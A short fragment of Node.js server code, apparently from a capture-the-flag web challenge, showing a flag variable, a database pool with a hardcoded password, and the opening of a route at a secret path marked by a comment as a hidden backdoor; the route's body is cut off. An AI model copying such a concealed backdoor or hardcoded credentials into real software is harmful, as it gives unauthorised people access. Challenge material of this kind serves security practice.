...
const flag = process.env.FLAG || 'nn9ed{test}';

const pool = mariadb.createPool({host: '127.0.0.1', port: 3306, database: 'xss', user: 'xss', password: 'secretpassword'});
...
/* HIDE BACKDOOR FROM SOURCE */
app.get('/l0g1nb4ckdoortr1ck1337!', function (req, res) {
